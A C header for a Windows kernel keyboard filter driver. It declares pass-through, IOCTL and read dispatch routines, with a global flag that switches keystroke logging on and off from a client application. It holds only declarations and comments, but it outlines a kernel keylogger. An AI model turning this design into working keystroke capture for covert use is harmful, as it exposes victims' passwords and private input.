#pragma once
#include <ntddk.h>

// Contains the DRIVER_DISPATCH callback functions.

// Indicates if logging of keypresses is switched on or off.
extern BOOLEAN isLogging;
// Semaphore to check if a read opreation has finished.
extern KSEMAPHORE readSemaphore;

// Finishes a request or passes it through to the next driver in the stack.
//
// Parameters:
// [in] pDeviceObject:
// Caller-supplied pointer to a DEVICE_OBJECT structure.
//
// [in/out] pIrp:
// Address of the IRP describing the requested I/O operation.
// 
// Return:
// An appropriate NTSTATUS value.
NTSTATUS passThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

// Finishes an device control request from the client application indicated by the IOCTL code.
// Either returns the current logging state, or switches the logging on or off.
//
// Parameters:
// [in] pDeviceObject:
// Caller-supplied pointer to a DEVICE_OBJECT structure.
//
// [in/out] pIrp:
// Address of the IRP describing the requested I/O operation.
// 
// Return:
// An appropriate NTSTATUS value.
NTSTATUS dispatchDevCtl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

// Passes a read request to the next driver in the stack.
// Assumes the next driver is a low level keyboard driver.
// Sets a completions routine that is able to log keystrokes of the keyboard if logging is switched on.
//
// Parameters:
// [in] pDeviceObject:
// Caller-supplied pointer to a DEVICE_OBJECT structure.
//
// [in/out] pIrp:
// Address of the IRP describing the requested I/O operation.
// 
// Return:
// An appropriate NTSTATUS value.
NTSTATUS dispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
